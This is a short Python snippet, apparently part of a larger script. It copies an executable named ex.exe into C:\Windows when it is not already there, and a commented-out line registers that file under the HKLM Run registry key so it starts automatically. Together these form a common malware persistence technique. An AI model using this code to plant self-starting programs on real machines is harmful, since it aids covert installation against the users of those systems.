path = "C:/Windows/ex.exe"
    if (os.path.isfile(path)) == False:
        os.system("copy ex.exe C:\Windows")
        #os.system('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v exampl /t REG_SZ /d "C:\WINDOWS\ex.exe" /f')